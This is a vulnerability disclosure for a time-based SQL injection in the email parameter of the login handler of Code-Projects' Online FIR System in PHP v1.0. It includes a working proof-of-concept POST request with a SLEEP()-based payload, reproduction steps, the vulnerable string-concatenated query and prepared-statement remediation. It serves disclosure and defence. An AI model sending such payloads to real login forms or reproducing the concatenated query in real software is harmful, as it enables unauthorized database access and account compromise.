## SQL Injection in Online FIR System PHP email Parameter
## Credit

Discovered by: 
Ahmad Marzouk

## Product

Online FIR System in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/online-fir-system-in-php-with-source-code/

## Affected Version

Online FIR System v1.0

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

High

## Description

A SQL Injection vulnerability exists in the Online FIR System in PHP within the authentication functionality.

The vulnerability occurs in the login processing component located at:

/Online_FIR_System/Login/checklogin.php

The application processes user-supplied input through the email and password parameters during login. The email parameter is directly used in backend SQL queries without proper validation, sanitization, or parameterization.

Testing confirmed that the email parameter is vulnerable to time-based SQL injection, indicating that attacker-controlled SQL expressions are executed by the database engine.

By injecting a crafted payload into the email parameter, an attacker can manipulate the SQL query structure. In the provided request, a delay-based payload using the SLEEP() function was used:

email=pradh@gmail.com'+(select*from(select(sleep(20)))a)+'

When the request is processed, the server response is delayed by approximately 20 seconds, confirming successful SQL injection.

Because the application does not properly sanitize input or use prepared statements, it allows attackers to execute arbitrary SQL queries.

## Root Cause

The vulnerability is caused by unsafe SQL query construction using user-controlled input.

The application retrieves the email parameter from the HTTP request and incorporates it directly into an SQL query without validation or parameter binding.

A typical vulnerable implementation is:

$email = $_POST['email'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE email='$email' AND password='$password'";

Because the input is concatenated directly into the SQL statement, attackers can inject malicious SQL code that alters the query logic.

The absence of prepared statements and input validation leads to SQL injection.

## Affected Endpoint
/Online_FIR_System/Login/checklogin.php
## Vulnerable Parameter
email
## HTTP Method
POST
## Proof of Concept

The following HTTP request demonstrates exploitation of the vulnerability:
 ```plain
POST /Online_FIR_System/Login/checklogin.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Origin: https://localhost
Upgrade-Insecure-Requests: 1
Referer: https://localhost/Online_FIR_System/Login/login.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

email=pradh@gmail.com'%2b(select*from(select(sleep(20)))a)%2b'&password=daya
 ```
## Steps to Reproduce

Install the Online FIR System in PHP.

Navigate to the login page.

Intercept the login request using a proxy tool such as Burp Suite.

Modify the email parameter to include a SQL injection payload:

'+(select*from(select(sleep(20)))a)+'

Send the modified request.

## Result

The server response is delayed by approximately 20 seconds, confirming that the injected SQL payload is executed.

This demonstrates that the application is vulnerable to SQL injection.

## Impact

Successful exploitation of this vulnerability may allow attackers to:

Bypass authentication

Extract sensitive database information

Access user accounts

Modify or delete database records

Escalate privileges

Gain full control over the application database

In severe cases, attackers may fully compromise the application.

## Vulnerability Classification
CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation
Use Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->execute([$email, $password]);
Input Validation

Validate user input formats (e.g., email structure).

Least Privilege Principle

Ensure database accounts have minimal privileges.

Security Testing

Conduct regular penetration testing and code audits.

## PoC 

<img width="964" height="651" alt="Image" src="https://github.com/user-attachments/assets/5df5aaad-c9aa-42c0-9ca0-141afa42e26e" />
